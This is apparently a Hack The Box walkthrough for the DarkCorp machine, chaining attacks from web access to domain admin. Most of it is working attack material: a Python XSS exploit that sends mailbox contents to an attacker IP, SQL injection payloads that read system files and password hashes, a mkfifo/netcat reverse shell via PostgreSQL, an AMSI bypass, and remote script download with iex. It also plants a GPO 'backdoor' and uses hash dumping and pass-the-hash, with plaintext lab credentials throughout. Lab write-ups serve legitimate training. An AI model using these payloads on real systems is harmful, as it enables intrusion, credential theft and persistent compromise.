# Nmap
```
PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp  open  http          nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-10T05:11:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

# Page check 
**drip.htb**
![](images/Pasted%20image%2020250210161437.png)
There is another sub-domain `mail.drip.htb` for `sign in` page

**mail.drip.htb**
![](images/Pasted%20image%2020250210161625.png)
Then we can register an account to login.
![](images/Pasted%20image%2020250213162438.png)
When we successfully login to the dashboard, we can find the version of this service 
`Roundcube Webmail 1.6.7`
![](images/Pasted%20image%2020250213162550.png)

# CVE-2024-42009
By searching the exploits of this service, we can find a XSS vulner here.
![](images/Pasted%20image%2020250213162805.png)
Let's look at the default email headers and note the `drip.darkcorp.htb` domain :
```
Return-Path: <no-reply@drip.htb>  
Delivered-To: root@drip.htb  
Received: from drip.htb  
    by drip.darkcorp.htb with LMTP  
    id EHcECx+CrWd/QQIA8Y1rLw  
    (envelope-from <no-reply@drip.htb>)  
    for <root@drip.htb>; Wed, 12 Feb 2025 22:24:47 -0700  
Received: from drip.darkcorp.htb (localhost [127.0.0.1])  
    by drip.htb (Postfix) with ESMTP id 2BEA52397  
    for <root@drip.htb>; Wed, 12 Feb 2025 22:24:47 -0700 (MST)  
Content-Type: text/plain; charset="utf-8"  
MIME-Version: 1.0  
Content-Transfer-Encoding: 8bit  
Subject: Welcome to DripMail!  
From: no-reply@drip.htb  
To: root@drip.htb  
Date: Wed, 12 Feb 2025 22:24:47 -0700  
Message-ID: <173942428714.630.5808751956165052919@drip.darkcorp.htb>  
Reply-To: support@drip.htb
```
Let's try to send ourselves a letter from a form on the site and intercept the request via Burp Suite:
![](images/Pasted%20image%2020250213163729.png)
![](images/Pasted%20image%2020250213163811.png)
Then we just need to change `recipient=support%40drip.htb` into `recipient=root%40drip.htb`, then we can get the answer from the email dashboard.
![](images/Pasted%20image%2020250213163935.png)
There is another email here and we can try to exploit the XSS exploit to this user `bcase@drip.htb`

This version of Roundcube allows you to do XSS with 0-click. We will use CVE-2024-42008 and
repeat this video , and we will take the description of the vulnerabilities from the article .
`https://www.youtube.com/watch?v=X7UX7b7Tkrk`
And there is an article `https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/`

Let's take a script from the guys from a well-known forum and modify it a little:
```
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html


# Configuration
TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 8000
LISTEN_IP = '0.0.0.0'

# Payload for the POST request
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = 3
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.16.10:8000/c=${btoa(t)}`)) foo=bar">Foo</body>'

post_data = {
    'name': 'root',
    'email': 'root@drip.htb',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}
print(f"{start_mesg}{message}{end_mesg}")

# Headers for the POST request
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE',
    'Connection': 'close'
}

# Function to send the POST request
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            print(f"[+] Received data {decoded_data}")
            tree = html.fromstring(decoded_data)

            # XPath query to find the div with id 'messagebody'
            message_body = tree.xpath('//div[@id="messagebody"]')
           
            # Check if the div exists and extract the content
            if message_body:
                # Extract inner text, preserving line breaks
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")

        else:
            print("[!] Received request but no data found.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging

# Function to start the HTTP server
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
    httpd.serve_forever()

# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
```

Firstly, we can check the uid 3 message:
```
Hey Bryce,

The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.

You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.

If you encounter any issues or have feedback, let me know so I can address them promptly.
```

Then we can get the other sub-domain here `dev-a3f1-01.drip.htb` and we can access to forget password page, we need to submit the target email
![](images/Pasted%20image%2020250310113003.png)
Then continue use the exploit script to get the message
```
[+] Extracted Message Body Content:

Your reset token has generated.  Please reset your password within the next 5 minutes.

You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z843cA.CLsWMVfy8rPH4MbwMtEytJJ0j_8


```
![](images/Pasted%20image%2020250310115154.png)
Then we can get into account of `bcase@drip.htb`
![](images/Pasted%20image%2020250310115427.png)

# SQL-injection by bcase
There is a obvious sql-injection here when I search `5001'`
![](images/Pasted%20image%2020250310124457.png)

Let's read the /etc/hosts file with the payload `''; SELECT pg_read_file('/etc/hosts', 0, 2000);`
![](images/Pasted%20image%2020250310124638.png)
```
127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
```

Then continue to check `/etc/passwd` with the payload `''; SELECT pg_read_file('/etc/passwd', 0, 2000);`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```
Continue to check the databases `''; SELECT datname FROM pg_database;`
```
|   |   |   |   |   |
|---|---|---|---|---|
|postgres|||||
|template1|||||
|template0|||||
|roundcube|||||
|dripmail|
```

Then check the tables `''; SELECT tablename FROM pg_tables;`
![](images/Pasted%20image%2020250310125006.png)

Let's get the password hashes: `''; (SELECT password FROM "Users") `
```
|   |   |   |   |   |
|---|---|---|---|---|
|d9b9ecbf29db8054b21f303072b37c4e|||||
|1eace53df87b9a15a37fdc11da2d298d|||||
|0cebd84e066fd988e89083879e88c5f9|||||
|63a9f0ea7bb98050796b649e85481845|
```
And there is admin hash `''; (SELECT password FROM "Admins") `
```
e10adc3949ba59abbe56e057f20f883e
```
Not a single hash can be brute-forced.
Let's try to look at the database logs. To do this, first determine the version:
`''; SELECT version();`
```
PostgreSQL 15.10 (Debian 15.10-0+deb12u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
```

Now you can try to read the log:
`''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log', 0,
10000000);`
In this log file, there is nothing interesting here.

Let's check the old version of log files
`''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0,
10000000);`
![](images/Pasted%20image%2020250310125902.png)
Then we can get the hash of user `ebelford`
`8bbd7f88841b4223ae63c8848969be86`
From the crackstation, we can get the cracked hash `8bbd7f88841b4223ae63c8848969be86:ThePlague61780`

Let's use ssh to connect it and then we can handle the shell as `ebelford`
`ssh ebelford@10.10.11.54`   (`ebelford:ThePlague61780`)

# Switch to user postgres
In the `/var/backups` directory we find backups from `postgres` from the database user:
```
$ ls -la /var/backups | grep postgres
drwx------ 2 postgres postgres 4096 Feb 5 1252 postgres
```

Let's try to switch into `postgres` user
I can get something useful from `/var/www/html/dashboard/.env`
```
ebelford@drip:/var/www/html/dashboard$ cat .env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

Let's get the shell from this user:
```
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 4242 >/tmp/f';

# on your car
$ rlwrap nc -lnvp 4242
# on the attacked machine
$ PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
psql> COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat
/tmp/f|bash -i 2>&1|nc 10.10.16.3 4242 >/tmp/f';
# in the terminal as user postgres
$ mkdir -p ~/.ssh echo "ssh-ed25519
AAAAC3NzaC1lZDI1NTE5AAAAIGPqkrmvSthuwL/gpIhNJ7ioSieOV53BZH4bMDKalyMF
kiberdruzhinnik@vm" > ~/.ssh/authorized_keys
# back on your machine
$ ssh postgres@drip.htb
```

Then we can check the backup files.
```
postgres@drip:/var/backups/postgres$ ls -al
total 12
drwx------ 2 postgres postgres 4096 Feb  5 12:52 .
drwxr-xr-x 3 root     root     4096 Feb 11 08:10 ..
-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
```

Let's try to decrypt the old backup using the database password:
```
gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > /var/backups/postgres/dev-dripmail.old.sql

```
And let's look inside:
```
$ cat /var/backups/postgres/dev-dripmail.old.sql

COPY public."Admins" (id, username, password, email) FROM stdin;
1 bcase dc5484871bc95c4eab58032884be7225 bcase@drip.htb
2 victor.r cac1c7b0e7008d67b6db40c03e76b9c0 victor.r@drip.htb
3 ebelford 8bbd7f88841b4223ae63c8848969be86 ebelford@drip.htb
```

Then we can crack these hashes `victor.r:victor1gustavo@#`

Remember we get before `/etc/hosts`
```
127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
```

We need to port forwarding into our local machine.
Let's use `sshuttle` for forwarding:
Don't forget to add to /etc/hosts :
`172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb`
`172.16.20.3 drip.darkcorp.htb`

```
sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
```

PS: sshuttle forwards only TCP traffic by default
`sshuttle` is mainly used to tunnel TCP traffic, and ICMP (the protocol used by the ping command) is not forwarded by default. Therefore, even if the tunnel is successfully established, the ping command may not be able to detect the connectivity of the target host through the tunnel.

Just in case, let's ping 172.16.20.2 :
```
$ ping 172.16.20.2
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=2557 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=1620 ms
64 bytes from 172.16.20.2: icmp_seq=3 ttl=64 time=606 ms
```
And by `nmap`, we can check the valid port and services:
```
nmap -sCTV -Pn -vvv 172.16.20.2
80
5000
```
Port 80
![](images/Pasted%20image%2020250312005548.png)

Port 5000, we can use the credentials of victor to login
![](images/Pasted%20image%2020250312005811.png)

# Bloodhound by `victor`
Let's partially use `proxychains4`:
```
Remember your local /etc/hosts should be
10.10.11.54 drip.htb mail.drip.htb dev-a3f1-01.drip.htb
172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.2 WEB-01 WEB-01.darkcorp.htb
172.16.20.3 drip.darkcorp.htb

$ sudo apt install proxychains4
$ sudo nano /etc/proxychains4.conf

/etc/proxychains4.conf
dnat 10.10.14.17  172.16.20.1
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

Then set up ssh forwarding
```
sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080 ebelford@drip.htb
```

There is a good way to `ntpdate` the timezone with `dc01` server
```
DATE_UTC=$(ssh ebelford@drip.htb "date -u +%Y-%m-%dT%H:%M:%S")
sudo timedatectl set-timezone UTC
sudo date -s "$DATE_UTC"
```

Finally collect bloodhound information
```
proxychains4 bloodhound-python -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -dc dc-01.darkcorp.htb --dns-tcp -ns 172.16.20.1 --dns-timeout 10 -c ALL -d darkcorp.htb --zip
```
![](images/Pasted%20image%2020250718023355.png)
The next conventional approach is to first obtain the website `172.16.20.2`'s only privilege, and then use `ntlmrelayx` attack to obtain the system privileges of the machine.
```
sudo impacket-ntlmrelayx -t ldaps://172.16.20.1 -debug -i -smb2support -domain
darkcorp.htb
```
But I don't know why I can't run it successfully.

Another non-optimal way is to brute force the password of `taylor.b.adm: !QAZzaq1`.
```
hydra -l taylor.b.adm -P /usr/share/wordlists/rockyou.txt -o test.log  -vV ldap3://172.16.20.1
```

Then we can get the shell as `taylor`
# Elevate Privileges
Then use the `PowerGPOAbuse.ps1` script to elevate privileges
```
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> $a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'};$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'};[IntPtr]$c =$b.GetValue($null);[Int32[]]$d = @(0xff);[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> iex(New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerGPOAbuse.ps1')

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates'
True

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Set-GPRegistryValue -Name "SecurityUpdates" -key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -ExecutionPolicy Bypass -NoProfile -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""

DisplayName      : SecurityUpdates
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786
GpoStatus        : AllSettingsEnabled
Description      : Windows Security Group Policy
CreationTime     : 1/3/2025 3:01:12 PM
ModificationTime : 2/14/2025 5:30:20 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 2, SysVol Version: 2
WmiFilter        :

*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

Attack intent:
Bypass security software detection to ensure that subsequent downloaded malicious scripts (such as `PowerGPOAbuse.ps1`) will not be blocked.

Download and load the `PowerGPOAbuse` script
```
iex(New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerGPOAbuse.ps1')
```

Add the user to the local administrator group via GPO
```
Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates
```

Implanting a persistent backdoor via a GPO registry key
```
Set-GPRegistryValue -Name "SecurityUpdates" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""
```

Force update of Group Policy
```
gpupdate /force
```

Then you can use `impacket-secretsdump` to get the hash and log in to the terminal
```
impacket-secretsdump darkcorp/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
```

I will give you guys the hash here, because it's really hard to control
```
evil-winrm -i dc-01.darkcorp.htb -u "administrator" -H
"fcb3ca5a19a1ccf2d14c13e8b64cde0f"
```

Finally, you can get the superuser shell.

# Description

I only want to describe this machine in one sentence.
Its difficulty and knowledge coverage far exceed all the current AD domain environment machines. 

This is a machine that can be regarded as a treasure. Under the premise of such complex various exploits, the stability of the machine can be guaranteed as much as possible. It can be called the best machine in Hackthebox, no doubt about it.

It is well worth studying and reviewing again and again, and truly exceeds the complexity of pro lab.

**This machine is not suitable for beginners, and even experts have to spend a lot of effort here.**